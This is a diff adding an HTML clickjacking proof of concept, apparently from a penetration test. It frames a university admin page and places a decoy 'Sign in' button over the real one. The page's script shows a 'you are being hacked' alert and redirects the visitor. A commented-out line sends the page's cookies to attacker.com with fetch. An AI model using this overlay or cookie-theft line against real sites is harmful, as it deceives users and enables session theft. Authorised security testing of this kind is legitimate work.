@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Clickjacking Login Test</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      opacity: 1.0;
+      z-index: 1;
+      border: none;
+      pointer-events: auto;
+    }
+
+    #bait {
+      position: absolute;
+      top: 514px;     /* Moved lower to match "Sign in" */
+      left: 1085px;    /* Centered horizontally on the button */
+      padding: 7px 4px;
+      background-color: #5bc0de;
+      color: white;
+      font-size: 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      z-index: 2;
+    }
+
+    #bait:hover {
+      background-color: #5bc0de;
+    }
+  </style>
+</head>
+<body>
+
+  <button id="bait" onclick="triggerXSS()">Sign in</button>
+  <iframe src="https://vaptjhub.uol.edu.pk/admin"></iframe>
+
+  <script>
+    function triggerXSS() {
+      alert('LEAVE THIS PAGE! YOU ARE BEING HACKED By jr VAPT Specialist UOL!');
+  
+      // Optional: send data
+      // fetch('http://attacker.com/steal?cookie=' + document.cookie);
+      window.location.href = "http://vaptjhub.uol.edu.pk/admin";
+      // Remove bait button to allow real click-through
+      document.getElementById('bait').style.display = 'none';
+    }
+  </script>  
+
+</body>
+</html>
